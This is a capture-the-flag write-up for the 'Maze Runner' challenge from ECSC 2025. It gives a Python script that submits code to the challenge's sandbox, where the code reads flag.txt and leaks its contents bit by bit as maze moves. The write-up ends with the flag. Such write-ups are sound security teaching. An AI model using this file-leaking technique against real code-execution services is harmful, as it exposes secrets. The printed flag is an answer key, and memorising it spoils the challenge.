# Maze Runner

> Challenge inspired by an unhinged approach author took while trying to solve the "Fish Maze" on Google CTF 2025.
>
> [maze-runner.7z](https://hack.cert.pl/files/maze-runner-c40b5f2680f3952e454944b8b956c86d0de74706.7z)
>
> [https://maze-runner.ecsc25.hack.cert.pl/](https://maze-runner.ecsc25.hack.cert.pl/)

## Solution
Well, there's nothing stopping us from reading the contents of `flag.txt` and leaking it as a sequence of moves in the maze, is there?

```py
from Crypto.Util.number import long_to_bytes
import requests

flag = ''
idx = 0
done = False

while not done: # needs to be put in a loop as there is an upper bound on the number of moves
    code = '''
if not hasattr(make_move, 'bits'):
    make_move.bits = ''.join(f'{ord(x):08b}' for x in open('flag.txt', 'rt').read())[%s:]
if len(make_move.bits) == 0:
    return 2
[b, *make_move.bits] = make_move.bits
return int(b)
    ''' % idx
    res = requests.post('https://maze-runner.ecsc25.hack.cert.pl/submit', json={'code': code})
    moves = res.json()['moves']
    try:
        moves = moves[:moves.index(2)]
        done = True
    except ValueError: # raised if 2 is not in moves
        idx += len(moves)
    flag += ''.join(map(str, moves))

print(long_to_bytes(int(flag, 2)).decode())
```

## Flag
`ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_the_way!}`
